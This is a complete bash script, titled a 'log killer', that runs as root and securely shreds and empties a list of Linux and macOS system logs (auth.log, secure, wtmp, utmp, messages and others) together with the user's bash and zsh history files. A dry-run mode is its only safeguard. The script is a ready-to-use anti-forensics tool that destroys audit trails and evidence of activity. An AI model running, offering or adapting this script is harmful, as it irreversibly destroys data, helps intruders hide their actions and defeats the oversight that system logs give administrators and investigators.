#!/usr/bin/env bash

# Log file for auditing
LOG_FILE="/var/log/log_killer.log"

# Function to log messages
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

# Function to check if running as root
check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        log "Error: This script must be run as root or with sudo."
        exit 1
    fi
}

# Function to expand paths (e.g., ~/)
expand_path() {
    local path="$1"
    if [[ "$path" == ~* ]]; then
        path="${path/#~/$HOME}"
    fi
    echo "$path"
}

# Function to shred and clear logs
start_log_killer() {
    local dry_run=false
    if [ "$1" == "--dry-run" ]; then
        dry_run=true
        log "Dry run mode enabled. No files will be modified."
    fi

    log_list=(
        "/var/log/messages" "/var/log/auth.log" "/var/log/kern.log" 
        "/var/log/cron.log" "/var/log/maillog" "/var/log/boot.log" 
        "/var/log/mysqld.log" "/var/log/secure" "/var/log/utmp" 
        "/var/log/wtmp" "/var/log/yum.log" "/var/log/system.log" 
        "/var/log/DiagnosticMessages" "$HOME/.zsh_history" "$HOME/.bash_history"
    )

    for log in "${log_list[@]}"; do
        log="$(expand_path "$log")"
        if [ -f "$log" ]; then
            if [ "$dry_run" = true ]; then
                log "[Dry Run] Would shred and clear: $log"
            else
                if shred -vfzu "$log" && :> "$log"; then
                    log "Successfully shredded and cleared: $log"
                else
                    log "Failed to shred and clear: $log"
                fi
            fi
        else
            log "File not found: $log"
        fi
    done
}

# Main execution
check_root
log "Starting log killer script."

# Parse arguments
if [ "$1" == "--dry-run" ]; then
    start_log_killer "--dry-run"
else
    start_log_killer
fi

log "Log killer script completed."